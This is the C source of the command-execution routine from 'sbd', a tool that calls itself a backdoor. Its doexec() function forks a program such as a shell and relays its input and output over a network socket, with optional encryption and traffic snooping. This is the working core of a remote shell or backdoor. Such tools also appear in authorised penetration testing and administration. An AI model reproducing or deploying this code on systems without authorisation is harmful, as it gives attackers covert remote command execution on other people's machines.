/*
 * sbd - shadowinteger's backdoor
 * Copyright (C) 2004 Michel Blomgren <michel.blomgren@tigerteam.se>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation; either version 2 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc., 59
 * Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 * See the COPYING file for more information.
 */

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#include "pel.h"

extern int errno;

extern char *program_to_execute;
extern int respawn_enabled;
extern int use_encryption;
extern int quiet;
extern int snooping;
extern int immobility_timeout;

extern int highlight_incoming;
extern char highlight_prefix[];
extern char highlight_suffix[];

/*
    this doexec() handles execution for sbd on Unix-like operating systems.
    there are really 3 implementations: 1) if encryption is used, a parent
    process is handling encryption/decryption for the child, pipes are used
    for communication between the running program's process and the polling
    parent process. 2) if respawning/reconnection has been enabled, the
    process simply runs the app in a fork()ed process. 3) if
    respawning/reconnection is not enabled, the app to execute takes over the
    process (stdin, stdout, stderr is the peer socket).
*/

int doexec(int socketfd) {
    char buf[BUFSIZE];
    register char *p;

    int read_pipe[2];
    int write_pipe[2];
    int readfd, writefd;
    int writefdflags;
    int pid;

    if (!program_to_execute) {
        if (!quiet)
            fprintf(stderr, "no program to execute\n");
        close(socketfd);
        return 1;
    }

    /* we do the same that netcat is doing :) */
    p = strrchr(program_to_execute, '/');
    if (p) {
        p++;
    } else {
        p = program_to_execute;
    }

    /* piping starts */

    if (pipe(read_pipe)) {
        if (!quiet)
            perror("pipe()");
        close(socketfd);
        return 1;
    }
    if (pipe(write_pipe)) {
        if (!quiet)
            perror("pipe()");
        close(read_pipe[0]);
        close(read_pipe[1]);
        close(socketfd);
        return 1;
    }

    readfd = read_pipe[0];
    writefd = write_pipe[1];

    /* set non-blocking IO on writefd, otherwise it's possible write() will hang infinitely */
    writefdflags = fcntl(writefd, F_GETFL, 0);
    fcntl(writefd, F_SETFL, writefdflags | O_NONBLOCK);


    pid = fork();

    if (pid == 0) {
        /* child */

        /* will cause problems if the child has the socket too */
        close(socketfd);

        dup2(write_pipe[0], STDIN_FILENO);
        dup2(read_pipe[1], STDOUT_FILENO);
        dup2(STDOUT_FILENO, STDERR_FILENO);

        /* if we don't close all of 'em, the select() loop below (in the
         * parent's process) will behave very badly.
         */
        close(read_pipe[0]);
        close(read_pipe[1]);
        close(write_pipe[0]);
        close(write_pipe[1]);

        execlp(program_to_execute, p, (char *)NULL);
        if (!quiet)
            perror(program_to_execute);
        exit(1);
    } else if (pid > 0) {
        /* parent */

        /* we can't use these (child process'), select() will not like
         * that they are open */
        close(read_pipe[1]);
        close(write_pipe[0]);

        while (1) {
            fd_set fds;
            struct timeval to1;
            int sel;

            FD_ZERO(&fds);
            FD_SET(socketfd, &fds);
            FD_SET(readfd, &fds);

            if (immobility_timeout > 0) {
                to1.tv_sec = immobility_timeout;
                to1.tv_usec = 0;
                sel = select(FD_SETSIZE, &fds, NULL, NULL, &to1);
            } else {
                sel = select(FD_SETSIZE, &fds, NULL, NULL, NULL);
            }

            if (sel > 0) {
                int cnt;
                if (FD_ISSET(socketfd, &fds)) {
                    if (use_encryption) {
                        /* pel_recv_msg() will modify cnt */
                        cnt = sizeof(buf);
                        if (pel_recv_msg(socketfd, buf, &cnt) != PEL_SUCCESS) {
                            break;
                        }
                    } else {
                        if ((cnt = recv(socketfd, buf, sizeof(buf), 0)) < 1) {
                            if ((cnt < 0) && (errno == EWOULDBLOCK || errno == EAGAIN)) {
                                continue;
                            } else {
                                break;
                            }
                        }
                    }
                    if (snooping) {
                        if (highlight_incoming) {
                            write(STDOUT_FILENO, highlight_prefix, strlen(highlight_prefix));
                            write(STDOUT_FILENO, buf, cnt);
                            write(STDOUT_FILENO, highlight_suffix, strlen(highlight_suffix));
                        } else {
                            write(STDOUT_FILENO, buf, cnt);
                        }
                    }
                    write(writefd, buf, cnt);
                }
                if (FD_ISSET(readfd, &fds)) {
                    if ((cnt = read(readfd, buf, sizeof(buf))) < 1) {
                        if ((cnt < 0) && (errno == EWOULDBLOCK || errno == EAGAIN)) {
                            continue;
                        } else {
                            break;
                        }
                    }
                    if (snooping) {
                        write(STDOUT_FILENO, buf, cnt);
                    }
                    if (use_encryption) {
                        if (pel_send_msg(socketfd, buf, cnt) != PEL_SUCCESS) {
                            break;
                        }
                    } else {
                        send(socketfd, buf, cnt, 0);
                    }
                }
            } else {
                if (sel < 0)
                    perror("select()");
                break;
            }
        }
        /* close pipes and socket */
        close(readfd);
        close(writefd);
        close(socketfd);
        /* then wait for the child to exit */
        wait(NULL);
    } else {
        if (!quiet)
            perror("fork()");
        /* close pipes and socket */
        close(read_pipe[0]);
        close(read_pipe[1]);
        close(write_pipe[0]);
        close(write_pipe[1]);
        close(socketfd);
        return 1;
    }

    return 0;
}
